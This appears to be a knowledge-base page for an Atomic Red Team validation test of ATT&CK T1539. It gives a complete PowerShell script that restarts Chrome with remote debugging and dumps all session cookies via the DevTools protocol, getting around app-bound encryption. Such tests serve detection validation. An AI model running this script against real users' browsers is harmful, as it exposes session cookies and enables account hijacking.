---
atomic_guid: "b647f4ee-88de-40ac-9419-f17fac9489a7"
title: "Steal Chrome v127+ cookies via Remote Debugging (Windows)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1539"
attack_technique_name: "Steal Web Session Cookie"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1539/T1539.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "b647f4ee-88de-40ac-9419-f17fac9489a7"
  - "Steal Chrome v127+ cookies via Remote Debugging (Windows)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Steal Chrome v127+ cookies via Remote Debugging (Windows)

Chrome v127+ uses app-bound encryption to protect cookies. This test bypasses that protection to obtain the cookies. If successful, the test outputs cookie values to the console.
Note: Will stop any instances of Chrome already running
Adapted from https://embracethered.com/blog/posts/2024/cookie-theft-in-2024-and-what-todo

## Metadata

- Atomic GUID: b647f4ee-88de-40ac-9419-f17fac9489a7
- Technique: T1539: Steal Web Session Cookie
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Source Path: atomics/T1539/T1539.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1539-steal_web_session_cookie|T1539]]

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$devToolsPort = 9222
$testUrl = "https://www.google.com"
stop-process -name "chrome" -force -erroraction silentlycontinue
$chromeProcess = Start-Process "chrome.exe" "$testUrl --remote-debugging-port=$devToolsPort --profile-directory=Default" -PassThru
Start-Sleep 10
$jsonResponse = Invoke-WebRequest "http://localhost:$devToolsPort/json" -UseBasicParsing
$devToolsPages = ConvertFrom-Json $jsonResponse.Content
$ws_url = $devToolsPages[0].webSocketDebuggerUrl
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$uri = New-Object System.Uri($ws_url)
$ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None).Wait()
$GET_ALL_COOKIES_REQUEST = '{"id": 1, "method": "Network.getAllCookies"}'
$buffer = [System.Text.Encoding]::UTF8.GetBytes($GET_ALL_COOKIES_REQUEST)
$segment = New-Object System.ArraySegment[byte] -ArgumentList $buffer, 0, $buffer.Length
$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, [System.Threading.CancellationToken]::None).Wait()
$completeMessage = New-Object System.Text.StringBuilder
do {
    $receivedBuffer = New-Object byte[] 2048
    $receivedSegment = New-Object System.ArraySegment[byte] -ArgumentList $receivedBuffer, 0, $receivedBuffer.Length
    $result = $ws.ReceiveAsync($receivedSegment, [System.Threading.CancellationToken]::None).Result
    $receivedString = [System.Text.Encoding]::UTF8.GetString($receivedSegment.Array, $receivedSegment.Offset, $result.Count)
    $completeMessage.Append($receivedString)
} while (-not $result.EndOfMessage)
$ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "Closing", [System.Threading.CancellationToken]::None).Wait()
try {
    $response = ConvertFrom-Json $completeMessage.ToString()
    $cookies = $response.result.cookies
} catch {
    Write-Host "Error parsing JSON data."
}
Write-Host $cookies
Stop-Process $chromeProcess -Force
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1539/T1539.yaml)
